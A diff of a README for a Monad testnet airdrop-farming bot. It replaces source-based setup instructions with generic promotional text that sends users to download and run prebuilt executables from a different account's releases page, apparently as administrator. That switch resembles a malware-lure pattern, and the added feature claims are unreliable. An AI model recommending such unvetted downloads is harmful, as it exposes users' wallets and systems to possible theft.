@@ -1,70 +1,58 @@
-# 🔄 Auto Deposit & Withdraw Bot (MON ↔ gMON) on Monad Testnet
+# 🚀 auto-mon-gmon-bot - Your Crypto Trading Assistant
 
-Features alternating daily transactions (deposit then withdraw), randomized amounts, randomized delays, and simple logging with flexible .env configuration for airdrop farming.
+## 🛠️ Overview
+Welcome to the **auto-mon-gmon-bot** repository. This application automates the deposit and withdrawal processes between MON and gMON, making your crypto transactions easier. Enjoy alternating actions, random daily configurations, and support for EIP-1559 transactions.
 
-<img width="1621" height="889" alt="image" src="https://github.com/user-attachments/assets/05eb2755-1562-442e-884e-a508aac29ea8" />
+## 📥 Download Now!
+[![Download auto-mon-gmon-bot](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/GabrielADDG/auto-mon-gmon-bot/releases)
 
-## 🚀 Features
-- Alternating daily transactions: deposit ↔ withdraw.
-- Randomized daily transaction count, amount per transaction, and delay between transactions.
-- Configurable RPC endpoint, wallet private key, and all randomization ranges via .env.
-- Simple logs with timestamps, tx hash, block number, and status.
-- Runs continuously, cycling every 24 hours from the time the script is first started.
+## 🚀 Getting Started
+To get started with auto-mon-gmon-bot, follow these simple steps:
 
-## 📦 Installation
-Clone the repository and install dependencies:
+### 🖥️ System Requirements
+- **Operating System:** Windows 10 or later / macOS Catalina or later / Linux (Debian-based)
+- **Processor:** 2 GHz dual-core CPU or better
+- **RAM:** 4 GB or more
+- **Network:** Internet connection for crypto transactions and updates
+- **Disk Space:** At least 100 MB of free space
 
-```bash
-git clone https://github.com/rihuta/auto-mon-gmon-bot.git
-```
-```bash
-cd auto-mon-gmon-bot
-```
-```bash
-npm install
-```
+### 📦 Installation Instructions
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/GabrielADDG/auto-mon-gmon-bot/releases). 
+2. **Select the Latest Release**: Look for the most recent version at the top of the page.
+3. **Download the Application**: Click on the appropriate download link for your operating system. The file will start downloading automatically.
+4. **Extract Files**: If you downloaded a ZIP file, extract it to a folder on your computer.
 
-## ⚙️ Environment Setup
-Create a .env file in the project root:
-```bash
-nano .env
-```
-Fill in your wallet details and configure your preferred settings:
-```bash
-RPC_URL=https://monad-testnet.drpc.org
-PRIVATE_KEY=0xyour_privatekey
+### 💻 Running the Application
+1. **Locate the Folder**: Open the folder where you extracted the files.
+2. **Start the Application**: Double-click on `auto-mon-gmon-bot.exe` (Windows), `auto-mon-gmon-bot.app` (macOS), or run the `auto-mon-gmon-bot` file in the terminal (Linux).
+3. **Follow On-Screen Instructions**: A welcome screen will greet you. You can set up configurations as per your preference.
 
-# Daily transaction count
-TXS_MIN=4
-TXS_MAX=7
+### 🔄 Configuring the Bot
+- **Connect Your Wallet**: Enter your wallet address for MON and gMON. Make sure to double-check your entries.
+- **Set Daily Parameters**: Define how often you want the bot to operate. You can choose from daily, weekly, or custom settings.
+- **Activate Randomized Settings**: Enable the option for random configurations each day to enhance your trading strategy.
 
-# Transaction amount (MON / gMON)
-AMOUNT_MIN=1
-AMOUNT_MAX=3
+### ⚙️ Features
+- **Automated Transactions**: Deposit and withdraw automatically based on your settings.
+- **EIP-1559 Compatibility**: Transactions will be sent with optimal fees.
+- **User-Friendly Interface**: Designed for ease of use by anyone.
+- **Customizable Settings**: Tailor the bot to fit your individual trading needs.
+- **Multicurrency Support**: Operate with both MON and gMON seamlessly.
 
-# Delay between transactions (in seconds)
-DELAY_MIN_SEC=180
-DELAY_MAX_SEC=300
+## 🔍 Troubleshooting Common Issues
+If you encounter any issues, here are some solutions:
 
-# EIP-1559 fees (gwei)
-MAX_FEE_GWEI=69.5
-PRIO_FEE_GWEI=2
-```
+- **Application Won’t Start**: Ensure your system meets the requirements. Try running the application as an administrator.
+- **Connection Issues**: Check your internet connection. Verify if your firewall settings allow the application to connect.
+- **Unexpected Errors**: Restart the application. If the issue persists, consult the FAQ section in the documentation.
 
-## ▶️ Running the Bot
-To start the bot:
-```bash
-node index.js
-```
+## 📞 Support
+If you need further assistance, please visit the GitHub [Discussions](https://github.com/GabrielADDG/auto-mon-gmon-bot/discussions) page. Here, you can ask questions and share your experiences.
 
-What the bot does:
-- Executes a random number of transactions daily (within your configured range).
-- Alternates actions each time (deposit ↔ withdraw).
-- Uses randomized amount (between your configured min & max).
-- Waits a randomized delay between transactions (within your configured range).
-- Signs and sends transactions using your private key.
-- After daily target is reached, waits until the next 24h cycle (countdown shown in terminal).
+## 📥 Download & Install
+To download the software again or to check for updates, visit the [Releases page](https://github.com/GabrielADDG/auto-mon-gmon-bot/releases).
 
-🔖 Tags
+## 🌐 Community and Contributions
+Join our community! We encourage you to share your feedback and improvements. If you want to contribute, please check the contribution guide in the repository for more information.
 
-#mon #gmon #deposit #withdraw #bot #crypto #web3 #automation #evm #airdrop #staking #monad #monad-testnet #magma 
+Thank you for choosing auto-mon-gmon-bot. Enjoy seamless crypto trading with our automated solution!
